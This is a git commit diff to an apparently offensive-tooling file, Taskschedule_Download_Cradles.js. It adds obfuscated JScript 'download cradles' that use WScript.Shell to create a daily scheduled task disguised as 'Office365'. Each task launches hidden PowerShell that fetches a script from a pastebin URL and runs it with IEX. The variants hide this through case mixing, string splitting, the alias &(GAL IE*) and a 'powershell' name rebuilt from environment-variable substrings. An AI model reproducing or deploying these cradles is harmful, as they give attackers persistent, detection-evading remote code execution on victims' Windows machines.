570508b18b9f858cf0bbdb411afe3a35114aacae
VirtualAllocEx <50073731+VirtualAlllocEx@users.noreply.github.com>
2022-03-26 23:08:15 +0100

    Update Taskschedule_Download_Cradles.js

--- Taskschedule_Download_Cradles.js
+++ Taskschedule_Download_Cradles.js
@@ -27,3 +27,12 @@ c.run('cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "%APPDA
 #Info: To escape \" in .js \\\\\\"
 c=new ActiveXObject("W"+"S"+"cr"+"ip"+"t."+"S"+"h"+"e"+"l"+"l");
 c.run('cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "PoWeRsHelL.eXe -NoP -w HidDen -c $a=neW-ObJeCt nET.wEbClieNt;$a.pROxy=[NeT.WeBreQueSt]::geTsyStEmweBprOxy();$a.prOxY.crEdEnTials=[NEt.crEdEnTiaLcaChe]::deFaUltcrEdeNtials;IeX $a.DOwNLOadstRiNg(\\\\\\"ht\\\\\\"+\\\\\\"tps://pastebin.com/raw/Qpiz8y6c\\\\\\")"', 0);
+
+#Info: &(GAL IE*) = Alias IEX
+c=new ActiveXObject("W"+"S"+"cr"+"ip"+"t."+"S"+"h"+"e"+"l"+"l");
+c.run('cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "PoWeRsHelL.eXe -NoP -w HidDen -c $a=neW-ObJeCt nET.wEbClieNt;$a.pROxy=[NeT.WeBreQueSt]::geTsyStEmweBprOxy();$a.prOxY.crEdEnTials=[NEt.crEdEnTiaLcaChe]::deFaUltcrEdeNtials;&(GAL IE*) $a.DOwNLOadstRiNg(\\\\\\"ht\\\\\\"+\\\\\\"tps://pastebin.com/raw/Qpiz8y6c\\\\\\")"', 0);
+
+#Info: %APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l = powershell.exe
+#Info: &(GAL IE*) = Alias IEX
+c=new ActiveXObject("W"+"S"+"cr"+"ip"+"t."+"S"+"h"+"e"+"l"+"l");
+c.run('cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "%APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l -NoP -w HidDen -c $a=neW-ObJeCt nET.wEbClieNt;$a.pROxy=[NeT.WeBreQueSt]::geTsyStEmweBprOxy();$a.prOxY.crEdEnTials=[NEt.crEdEnTiaLcaChe]::deFaUltcrEdeNtials;&(GAL IE*) $a.DOwNLOadstRiNg(\\\\\\"ht\\\\\\"+\\\\\\"tps://pastebin.com/raw/Qpiz8y6c\\\\\\")"', 0);
